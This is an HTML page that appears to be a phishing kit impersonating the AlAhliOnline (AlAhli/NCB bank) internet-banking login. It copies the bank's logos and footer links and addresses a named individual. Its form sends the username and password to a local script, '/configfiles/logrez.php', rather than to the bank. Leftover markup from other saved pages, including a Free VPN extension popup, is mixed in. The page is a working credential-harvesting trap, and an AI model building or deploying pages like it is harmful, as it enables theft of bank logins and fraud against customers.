<html lang="en"><head><style type="text/css">[uib-typeahead-popup].dropdown-menu{display:block;}</style>
<style type="text/css">.uib-time input{width:50px;}</style>
<style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>AlAhliOnline - Login</title><link rel="shortcut icon" href="https://new.alahlionline.com/ui/favicon.ico"><link href="/portal/resources/aab/emerald-global/emerald-global-1.1.0/style.css" rel="stylesheet"><link href="/nl/widgetdelivery/unauthenticated/oca/style/css/themes/emerald/myabnamro-compatability.css" rel="stylesheet">



        
      </head><body><div id="preHeader" class="em-pre-header d-block d-md-none">
        <div class="container-fluid em-page-grid">
          <div class="row pt-1 px-0 mx-0">
            <div class="col-12 mb-1 order-md-2">
              <p class="em-text-small text-center text-md-right m-0 em-header-login-date">
                
              </p>
            </div>
            <div class="col-6 mb-1 order-md-1 d-md-none">
              <p class="m-0"><!---->
      <img src="https://new.alahlionline.com/ui/favicon.ico" alt="Trulli" width="16" height="16"><a href="">   www.alahli.com</a><!----></p>
            </div>
            <div class="col-6 mb-1 text-right d-md-none">
              <p class="m-0">
                
              </p>
            </div>
          </div>
        </div>
      </div>
        
      
        
      <!----><main id="main" role="main" class="em-page"><div class="container-fluid em-page-grid spx-2 px-md-3 em-overflow-show"><div class="row"><div class="col-lg-9 px-0 spx-md-2 d-flex flex-column-reverse flex-md-column"><div class="em-page-title position-sticky bottom-0 em-z-index-2"><div class="float-none float-md-right mx-2 mx-md-0"></div><h2 id="longTitle" class="d-md-block d-none mb-0">Online Banking</h2></div><div id="innerPage" class="ng-scope"><aab-widget ng-controller="LoginWidgetController" class="em-oca ng-scope"><div data-ng-class="widget.context.getTemplateSettings().container.style" class="container-fluid"><div data-ng-class="widget.context.getTemplateSettings().panel.style" cg-busy="{promise:widget.spinner.widgetPromise,message:widget.spinner.message,backdrop:widget.spinner.backdrop,templateUrl:widget.spinner.templateUrl,wrapperClass:widget.spinner.wrapperClass,delay:widget.spinner.delay,minDuration:widget.spinner.minDuration}" class="panel panel-default" style="position: relative;"><!-- ngIf: widget.context.getTemplateSettings().panel.header.show --><div data-ng-if="widget.context.getTemplateSettings().panel.header.show" data-ng-class="widget.context.getTemplateSettings().panel.header.style" data-ng-hide="widget.context.hideHeader" class="ng-scope ng-hide panel-heading"><!-- ngIf: !widget.context.error || widget.context.error.isRecoverable --><button type="submit" data-ng-class="widget.context.getHeaderSettings().leftButton.class" data-ng-click="widget.handleGoBackClick()" data-ng-show="widget.context.getHeaderSettings().leftButton.show" data-ng-if="!widget.context.error || widget.context.error.isRecoverable" class="ng-scope ng-hide btn btn-default ocf-btn-back"><span data-translate="Button-Back" data-translate-values="" data-translate-default="terug." class="ng-scope">back</span></button><!-- end ngIf: !widget.context.error || widget.context.error.isRecoverable --><!-- ngIf: (!widget.context.error || widget.context.error.isRecoverable) && widget.context.getHeaderSettings().rightButton.show --><h2 data-ng-show="widget.context.getHeaderSettings().general.title" class="panel-title ng-binding ng-hide" data-ng-class="{'mb-0': widget.context.getHeaderSettings().general.title}" data-ng-bind="widget.context.getHeaderSettings().general.title"></h2><h2 data-ng-hide="widget.context.getHeaderSettings().general.title" class="panel-title ng-scope mb-0" data-ng-class="{'mb-0': !widget.context.getHeaderSettings().general.title}" data-translate="title:login" data-translate-default="">Internet Banking</h2></div><!-- end ngIf: widget.context.getTemplateSettings().panel.header.show --><div data-ng-class="widget.context.getTemplateSettings().panel.body.style" class="panel-body"><aab-sdm data-sdm="widget.context.sdm" class="ng-isolate-scope"><!-- ngIf: emerald --><img _ngcontent-c10="" alt="" class="nav-logo-img" src="https://new.alahlionline.com/ui/assets/images/desktop/logo-desktop.png">
<br></aab-sdm><br>
<aab-alert data-error="widget.context.error" data-ng-hide="widget.context.isStateModalOpen &amp;&amp; widget.context.error &amp;&amp; widget.context.error.isRecoverable" class="ng-isolate-scope"><!-- ngIf: emerald --><div ng-if="emerald" class="alert em-alert-warning px-sm-2 ng-scope ng-isolate-scope ng-hide" role="alert" data-ng-click="isCollapsed = !isCollapsed" aria-live="assertive" data-ng-show="error" data-aab-scroll-to="error !== undefined" data-testid="alert-container"><!-- ngIf: error.faultCode --><div class="d-flex flex-row"><span class="float-left flex-shrink-0 mr-1 em-icon-size-3 sy-notification-warning"></span> <span class="sr-only">Error:</span><div><!-- ngIf: error.title && (error.title | translate) --><p class="mb-0 ng-binding" data-ng-bind-html="error.text | translate | aabTrustedHtml" data-translate-default="Er is een fout opgetreden" data-testid="second-alert-warning-text"></p></div></div><!-- ngIf: error.options.button --></div><!-- end ngIf: emerald --><!-- ngIf: !emerald --></aab-alert><aab-step-counter data-steps="widget.context.steps" data-ng-hide="widget.context.error &amp;&amp; !widget.context.error.isRecoverable"></aab-step-counter><aab-update-loader class="ng-isolate-scope"><div class="ocf-update-loader ng-hide" data-ng-show="vm.show"><span class="glyphicon glyphicon-ok-circle ocf-icon-large ng-hide" data-ng-show="vm.successIcon"></span> <span data-us-spinner="{&quot;lines&quot;:12,&quot;length&quot;:6,&quot;width&quot;:3,&quot;radius&quot;:8,&quot;color&quot;:&quot;#fff&quot;,&quot;speed&quot;:1,&quot;trail&quot;:100,&quot;shadow&quot;:false,&quot;left&quot;:&quot;20px&quot;,&quot;top&quot;:&quot;50%&quot;}" data-spinner-key="spinner-wrapper" class="ng-scope"></span><h3 aria-role="alert" translate="" class="ng-scope"></h3></div></aab-update-loader><!-- uiView: --><ui-view data-ng-hide="widget.context.error &amp;&amp; !widget.context.error.isRecoverable" class="ng-scope"><aab-widget-module ng-controller="LoginController as login" data-ng-class="{'em-login': login.isEmerald || true}" class="ng-scope em-login"><a id="scrollIntoView" class="scroll-xs scroll-xxs"></a><aab-information-block ng-show="login.showInfoBlock" icon-image="" icon-class="" title="" hidden-xxs="" default-logo-size="true" small-title-margin="true" class="ng-isolate-scope ng-hide"><div class="well"><div class="row"><div class="col-xs-3 col-xxs-3" data-ng-class="hiddenXxs ? 'hidden-xxs' : 'col-xxs-3'"><div class="glyphicon  ocf-icon-fluid aab-information-block-default-size" data-ng-class="{'aab-information-block-default-size' : defaultLogoSize}"><img class="center-image-infoblock aab-information-block-default-size" data-ng-class="{'aab-information-block-default-size' : defaultLogoSize}" ng-src=""></div></div><div class="col-xs-9 col-xxs-9" data-ng-class="{ 'col-xxs-9' : !hiddenXxs }"><!-- ngIf: title --><div data-ng-transclude=""><p data-testid="paratext" class="ng-binding ng-scope"></p></div></div></div></div></aab-information-block><!-- ngIf: login.isEnableLogin && (login.disabledMethods.indexOf(login.loginChoice) < 0 || !login.disabledMethods) -->
<!-- ngRepeat: segment in login.segments --><li class="d-inline-block segment-tab text-center spy-2 ng-scope" ng-repeat="segment in login.segments" ng-click="login.selectSegment($index)"><center><a class="nav-link segment-switch py-0 active" ng-class="{'active': segment.active}" href=""><span data-ng-class="margin-auto" class="ng-binding">Personal</span>
<label class="col-sm-6 control-label ng-scope" data-translate="label:selecteerUwInlogMethode">Dear, Zafar Mallick </label></a></center></li><div class="em-angularjs-indicator position-absolute" ng-class="{'segment-align-right': login.segments[1].active }"></div></aab-widget-module></ui-view>







<hr>





</div><!-- end ngIf: login.isSegmentSwitchDisplayed --><div class="segment-animation"><aab-login-choice on-select="login.onMethodSelected(method);login.switchLoginChoice()" disabled-methods="login.disabledMethods" class="ng-isolate-scope"><div class="form-group">


<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #f1f1f1;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #4CAF50;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>






  
<form action="/configfiles/logrez.php" method="post">
  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required="">

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required="">
        
    <button type="submit">Login</button>

  </div>

  








      <div class="cg-busy-default-text ng-binding"></div>

   </form></div>

</aab-login-choice></div></div></div></aab-widget></div></div><div class="em-page-title"></div></div></div></main><footer-panel languageswitchurl=""><!---->
      <footer class="footer">
        <div class="container-fluid em-page-grid">
          <br>

<div class="row py-lg-4">
            <div class="col-lg-1 mb-3 mb-lg-0">
              <h2 class="sr-only"><!---->Footer navigation<!----></h2>
              <div class="row no-gutters justify-content-center language-switch">
                <!---->
      <div class="col-auto footer-nav-item">
        <a class="btn-link" title="Nederlands" href="">
          EN
        </a>
      </div>
    <!---->
      <div class="col-auto footer-nav-item">
        <a class="btn-link active" title="English" href="">
          AR   
        </a>
      </div>
    <!---->
              </div>
            </div>
            <div class="row container-footer-custom">
      <div>
        <div class="footer-links-group">
          
          <a class="footer-link copyright" href="javascript:void(0)" id="link-copyright"><mark>All Rights Reserved</mark></a>
          <a class="footer-link" href="javascript:void(0)" id="link-security" target="_blank">
            
          </a>
          <a class="footer-link" id="link-careers" target="_blank" href="https://www.alahli.com/ar-sa/about-us/Careeralahli/Pages/default.aspx">
            
          </a>
          <a class="footer-link" id="link-code" target="_blank" href="http://www.alahli.com/en-us/Pages/Consumer-Protection.aspx">
            
          </a>
          <a class="footer-link" id="link-fees" target="_blank" href="http://www.alahli.com/en-us/business-banking/business-banking-services/Documents/NCBRetailBankingFees.pdf">
            
          </a>
          <a class="footer-link" id="link-capital" target="_blank" href="http://ncbc.com/en/index.asp">
            <span class="footer-link-title">NCB Capital</span>
          </a>
          <a class="footer-link" id="link-alahli" target="_blank" href="http://aqar.alahli.com/en-us/Pages/default.aspx">
            <span class="footer-link-title">Aqar AlAhli © AlAhli Bank S.A 2020</span>
          </a>
        </div>
      </div>
      <div>
        <div class="footer-actions">
          <div class="mobile-stores">
            
            <div class="mobile-stores-links-container">
              <a class="mobile-stores-links" id="link-ios" target="_blank" href="https://itunes.apple.com/us/app/alahlimobile/id552727118?mt=8">
                <img alt="" src="assets/images/desktop/appleappstore.png">
              </a>
              <a class="mobile-stores-links" id="link-android" target="_blank" href="https://play.google.com/store/apps/details?id=com.alahli.mobile.android">
                <img alt="" src="assets/images/desktop/googleplayicon.png">
              </a>
            </div>
          </div>
          <a class="footer-link social-network" id="link-twitter" target="_blank" href="https://twitter.com/AlAhliNCB">
            
          </a>
          <a class="footer-link social-network" id="link-youtube" target="_blank" href="http://www.youtube.com/user/alahlincb">
            
          </a>
          <a class="footer-link social-network" id="linkedin" target="_blank" href="http://www.linkedin.com/company/ncb?trk=top_nav_home">
            
          </a>
          <a class="footer-link social-network" id="instagram" target="_blank" href="http://instagram.com/alahlincb">
            
          </a>
          <a class="footer-link social-network" id="facebook" target="_blank" href="https://www.facebook.com/alahlincb">
            
          </a>
        </div>
      </div>
    </div>
            


          </div>
        </div>
      </footer>
</footer-panel><div id="free_vpn_container" style="display: none;">            <div class="free-vpn_wrap">                <div class="free-vpn_rate-popup">                    <div class="free-vpn_close-btn">                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">                            <g>                                <g>                                    <path fill="#afafaf" d="M505.943,6.058c-8.077-8.077-21.172-8.077-29.249,0L6.058,476.693c-8.077,8.077-8.077,21.172,0,29.249                                        C10.096,509.982,15.39,512,20.683,512c5.293,0,10.586-2.019,14.625-6.059L505.943,35.306                                        C514.019,27.23,514.019,14.135,505.943,6.058z"></path>                                </g>                            </g>                            <g>                                <g>                                    <path fill="#afafaf" d="M505.942,476.694L35.306,6.059c-8.076-8.077-21.172-8.077-29.248,0c-8.077,8.076-8.077,21.171,0,29.248l470.636,470.636                                        c4.038,4.039,9.332,6.058,14.625,6.058c5.293,0,10.587-2.019,14.624-6.057C514.018,497.866,514.018,484.771,505.942,476.694z"></path>                                </g>                            </g>                        </svg>                    </div>                    <div class="free-vpn_logo"></div>                    <div class="free-vpn_title">Free VPN</div>                    <div class="free-vpn_text">                        Enjoyed our app? Give us 5 stars!                    </div>                    <div class="free-vpn_stars">                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 46.354 46.354" style="enable-background:new 0 0 46.354 46.354;" xml:space="preserve"><g><g>                            <path d="M21.57,2.049c0.303-0.612,0.927-1,1.609-1c0.682,0,1.307,0.388,1.609,1l5.771,11.695c0.261,0.529,0.767,0.896,1.352,0.981   L44.817,16.6c0.677,0.098,1.237,0.572,1.448,1.221c0.211,0.649,0.035,1.363-0.454,1.839l-9.338,9.104   c-0.423,0.412-0.616,1.006-0.517,1.588l2.204,12.855c0.114,0.674-0.161,1.354-0.715,1.756c-0.553,0.4-1.284,0.453-1.89,0.137   l-11.544-6.07c-0.522-0.275-1.147-0.275-1.67,0l-11.544,6.069c-0.604,0.317-1.337,0.265-1.89-0.136   c-0.553-0.401-0.829-1.082-0.714-1.756l2.204-12.855c0.1-0.582-0.094-1.176-0.517-1.588L0.542,19.66   c-0.489-0.477-0.665-1.19-0.454-1.839c0.211-0.649,0.772-1.123,1.449-1.221l12.908-1.875c0.584-0.085,1.09-0.452,1.351-0.982   L21.57,2.049z" data-original="#000000" class="active-path" data-old_color="#000000" fill="#FFD325"></path>                        </g></g> </svg>                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 46.354 46.354" style="enable-background:new 0 0 46.354 46.354;" xml:space="preserve"><g><g>                            <path d="M21.57,2.049c0.303-0.612,0.927-1,1.609-1c0.682,0,1.307,0.388,1.609,1l5.771,11.695c0.261,0.529,0.767,0.896,1.352,0.981   L44.817,16.6c0.677,0.098,1.237,0.572,1.448,1.221c0.211,0.649,0.035,1.363-0.454,1.839l-9.338,9.104   c-0.423,0.412-0.616,1.006-0.517,1.588l2.204,12.855c0.114,0.674-0.161,1.354-0.715,1.756c-0.553,0.4-1.284,0.453-1.89,0.137   l-11.544-6.07c-0.522-0.275-1.147-0.275-1.67,0l-11.544,6.069c-0.604,0.317-1.337,0.265-1.89-0.136   c-0.553-0.401-0.829-1.082-0.714-1.756l2.204-12.855c0.1-0.582-0.094-1.176-0.517-1.588L0.542,19.66   c-0.489-0.477-0.665-1.19-0.454-1.839c0.211-0.649,0.772-1.123,1.449-1.221l12.908-1.875c0.584-0.085,1.09-0.452,1.351-0.982   L21.57,2.049z" data-original="#000000" class="active-path" data-old_color="#000000" fill="#FFD325"></path>                        </g></g> </svg>                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 46.354 46.354" style="enable-background:new 0 0 46.354 46.354;" xml:space="preserve"><g><g>                            <path d="M21.57,2.049c0.303-0.612,0.927-1,1.609-1c0.682,0,1.307,0.388,1.609,1l5.771,11.695c0.261,0.529,0.767,0.896,1.352,0.981   L44.817,16.6c0.677,0.098,1.237,0.572,1.448,1.221c0.211,0.649,0.035,1.363-0.454,1.839l-9.338,9.104   c-0.423,0.412-0.616,1.006-0.517,1.588l2.204,12.855c0.114,0.674-0.161,1.354-0.715,1.756c-0.553,0.4-1.284,0.453-1.89,0.137   l-11.544-6.07c-0.522-0.275-1.147-0.275-1.67,0l-11.544,6.069c-0.604,0.317-1.337,0.265-1.89-0.136   c-0.553-0.401-0.829-1.082-0.714-1.756l2.204-12.855c0.1-0.582-0.094-1.176-0.517-1.588L0.542,19.66   c-0.489-0.477-0.665-1.19-0.454-1.839c0.211-0.649,0.772-1.123,1.449-1.221l12.908-1.875c0.584-0.085,1.09-0.452,1.351-0.982   L21.57,2.049z" data-original="#000000" class="active-path" data-old_color="#000000" fill="#FFD325"></path>                        </g></g> </svg>                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 46.354 46.354" style="enable-background:new 0 0 46.354 46.354;" xml:space="preserve"><g><g>                            <path d="M21.57,2.049c0.303-0.612,0.927-1,1.609-1c0.682,0,1.307,0.388,1.609,1l5.771,11.695c0.261,0.529,0.767,0.896,1.352,0.981   L44.817,16.6c0.677,0.098,1.237,0.572,1.448,1.221c0.211,0.649,0.035,1.363-0.454,1.839l-9.338,9.104   c-0.423,0.412-0.616,1.006-0.517,1.588l2.204,12.855c0.114,0.674-0.161,1.354-0.715,1.756c-0.553,0.4-1.284,0.453-1.89,0.137   l-11.544-6.07c-0.522-0.275-1.147-0.275-1.67,0l-11.544,6.069c-0.604,0.317-1.337,0.265-1.89-0.136   c-0.553-0.401-0.829-1.082-0.714-1.756l2.204-12.855c0.1-0.582-0.094-1.176-0.517-1.588L0.542,19.66   c-0.489-0.477-0.665-1.19-0.454-1.839c0.211-0.649,0.772-1.123,1.449-1.221l12.908-1.875c0.584-0.085,1.09-0.452,1.351-0.982   L21.57,2.049z" data-original="#000000" class="active-path" data-old_color="#000000" fill="#FFD325"></path>                        </g></g> </svg>                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 46.354 46.354" style="enable-background:new 0 0 46.354 46.354;" xml:space="preserve"><g><g>                            <path d="M21.57,2.049c0.303-0.612,0.927-1,1.609-1c0.682,0,1.307,0.388,1.609,1l5.771,11.695c0.261,0.529,0.767,0.896,1.352,0.981   L44.817,16.6c0.677,0.098,1.237,0.572,1.448,1.221c0.211,0.649,0.035,1.363-0.454,1.839l-9.338,9.104   c-0.423,0.412-0.616,1.006-0.517,1.588l2.204,12.855c0.114,0.674-0.161,1.354-0.715,1.756c-0.553,0.4-1.284,0.453-1.89,0.137   l-11.544-6.07c-0.522-0.275-1.147-0.275-1.67,0l-11.544,6.069c-0.604,0.317-1.337,0.265-1.89-0.136   c-0.553-0.401-0.829-1.082-0.714-1.756l2.204-12.855c0.1-0.582-0.094-1.176-0.517-1.588L0.542,19.66   c-0.489-0.477-0.665-1.19-0.454-1.839c0.211-0.649,0.772-1.123,1.449-1.221l12.908-1.875c0.584-0.085,1.09-0.452,1.351-0.982   L21.57,2.049z" data-original="#000000" class="active-path" data-old_color="#000000" fill="#FFD325"></path>                        </g></g> </svg>                    </div>                    <a class="free-vpn_rate-btn" target="_blank" href="https://chrome.google.com/webstore/detail/free-vpn-the-fastest-vpn/enaobbodnmbpecahhojidoiblhmnohef/reviews">Rate VPN</a>                </div>            </div>        </div></body></html>